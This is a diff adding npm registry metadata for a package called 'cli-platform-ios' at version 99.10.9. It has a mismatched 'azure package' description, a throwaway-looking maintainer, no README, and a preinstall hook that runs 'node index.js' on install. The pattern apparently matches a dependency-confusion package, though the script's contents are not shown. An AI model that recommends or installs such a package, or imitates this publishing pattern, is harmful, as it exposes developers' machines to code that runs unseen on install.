@@ -1,0 +1,62 @@
+{
+    "_id": "cli-platform-ios",
+    "name": "cli-platform-ios",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "cli-platform-ios",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "cli-platform-ios@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-u2QGxETraXKwrC+SskaZpctQ/SRTjl4h+P8sr7jAYVB7PvjX9UvZ8VzjwyAHY8lJdIGSox/b9extJIPLp4nSwg==",
+                "shasum": "83504fcdcc602588103e753acec5fd301a0e4c4c",
+                "tarball": "https://registry.npmjs.org/cli-platform-ios/-/cli-platform-ios-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5068,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiOvB/ACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmpkCQ//QBF/qTPaMgNVkzr59PCqX/trH5Fc2QQr46N9eFoW+kAZiDDm\r\n6Xa+i0IDCB62VeU/6bmdQXWC95su1YICC3E9yWO4MatiH9ORhUDId8foJvPs\r\nzHIkrensme7YtFbjU7KQAUB9AR9WuW6fNVD6gvEcpSXb0LRNIZJnnerF+ptK\r\nJda+N3JDdOUgw9q4m0P8v8oT+QWTakuhnKpJez8UY1dZf4lOKNbKfoD7F6Ot\r\njaLn2Y0HOyHuCUWxa4gJIoyghhRZj7gCX21k0t4gl09tdTWY402cQ65tMV9A\r\nCu8I6gxauIQmnkvbLOLYnu8QghyN2Hs3sEBraQ3f+cZHBdN0bK3coevPLDtm\r\nuKC+Ul+a3z34OvzlWhmJzmvP7gvDSaO8/ruYzNyTTtvDJ1Jzwm/qCMbmQWFv\r\nv4ujvRd0UwcMrGwwQP9pDcgl8VhH0oyf376PDhSoprVj9GJNJkqVxuUdm4pN\r\n1axlm9chQ/Hq41KKbTW7E8rJImJ5RHPr8aA+06m2F2/NbmChfaUrkVuuHlbz\r\nGbLJjALTC8drmf7XT9Duw8qkzmvcmOaJFxWiYOblHxzfq39YJKtAXvXlTPpp\r\nknUAck40FfMapKpvwxeLJ7esO7yaXyDjmQHXpsxRKyEsdv+kfess9UIqhCaw\r\nV4OMa/tENbLwD+UL3kEa6d8At44kziLfRVM=\r\n=ODNO\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "wtnwlsvk",
+                "email": "wtnwlsvk@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "wtnwlsvk",
+                    "email": "wtnwlsvk@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/cli-platform-ios_99.10.9_1648029823544_0.9104996769775351"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-23T10:03:43.544Z",
+        "99.10.9": "2022-03-23T10:03:43.670Z",
+        "modified": "2022-03-23T10:03:43.792Z"
+    },
+    "maintainers": [
+        {
+            "name": "wtnwlsvk",
+            "email": "wtnwlsvk@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
